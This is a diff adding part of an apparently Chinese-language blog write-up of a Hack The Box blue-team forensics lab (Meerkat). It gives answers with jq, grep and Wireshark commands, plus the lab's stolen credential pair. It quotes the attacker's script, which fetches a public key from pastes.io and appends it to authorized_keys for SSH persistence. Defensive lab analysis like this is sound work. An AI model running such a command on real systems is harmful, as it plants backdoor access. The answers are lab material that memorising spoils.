@@ -467,6 +467,46 @@ wtmp 可以用 utmpdump 看其中的內容
 </li>
 </ol>
 <p><code>cat output.json | jq   &#39;.[]._source.layers.http&#39;  | grep -v null |less</code><br>然後找 <code>/API</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-api-attack-string.png" alt=""></p>
+<ol start="5">
+<li>How many combinations of usernames and passwords were used in the credential stuffing attack?<ul>
+<li>56</li>
+</ul>
+</li>
+</ol>
+<p>把 <code>install/install</code> 去掉，因為他不屬於 Credential Stuffing 的範圍<br><code>cat output.json  | grep username | grep file_data | grep -v &quot;username=install&amp;password=install&amp;_l=en&quot; | sort -u | wc -l</code></p>
+<ol start="6">
+<li>Which username and password combination was successful?<ul>
+<li><a href="mailto:seb.broom@forela.co.uk">seb.broom@forela.co.uk</a>:g0vernm3nt</li>
+</ul>
+</li>
+</ol>
+<p>最後還是開 wireshark 做了…<br><code>http.request.method == &quot;POST&quot; or http.response.code !=401</code><br><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-login-success.png" alt=""><br>記得用 time 做排序</p>
+<ol start="7">
+<li>If any, which text sharing site did the attacker utilise?<ul>
+<li>pastes.io</li>
+</ul>
+</li>
+</ol>
+<p><img src="/img/2025/HTB-Intro-to-Blue-Team/HTB-Intro-to-Blue-Team-Meerkat-pastio.png" alt=""></p>
+<ol start="8">
+<li>Please provide the filename of the public key used by the attacker to gain persistence on our host.<ul>
+<li>hffgra4unv</li>
+</ul>
+</li>
+</ol>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://pastes.io/raw/bx5gcr0et8</span><br><span class="line">#!/bin/bash</span><br><span class="line">curl https://pastes.io/raw/hffgra4unv &gt;&gt; /home/ubuntu/.ssh/authorized_keys</span><br><span class="line">sudo service ssh restarta</span><br></pre></td></tr></table></figure>
+<ol start="9">
+<li>Can you confirm the file modified by the attacker to gain persistence?<ul>
+<li>/home/ubuntu/.ssh/authorized_keys</li>
+</ul>
+</li>
+</ol>
+<ol start="10">
+<li>Can you confirm the MITRE technique ID of this type of persistence mechanism?<ul>
+<li>T1098.004</li>
+</ul>
+</li>
+</ol>
 
 
                 
